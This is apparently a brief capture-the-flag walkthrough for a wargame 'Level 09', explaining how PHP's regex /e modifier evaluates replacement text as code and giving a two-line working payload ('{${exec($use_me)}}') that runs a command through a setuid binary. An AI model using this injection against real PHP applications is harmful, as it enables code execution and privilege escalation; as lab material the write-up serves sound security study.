### Level 09  

The vulnerability mentioned in the description is the `/e` modifier used in the regex,
combined with the function `preg_callback`.    

Briefly, if this modifier is set, the string passed in as the `replacement` argument is evaluated as PHP code.  

We are also going the second input parameter to ```flag09``` so we don't have escape anything:   
```
echo [email "{${exec($use_me)}}"] > /home/level09/file_with_email.txt
./flag09 /home/level09/file_with_email.txt getflag
```  
should work since ```flag09``` has the `setuid` bit set.  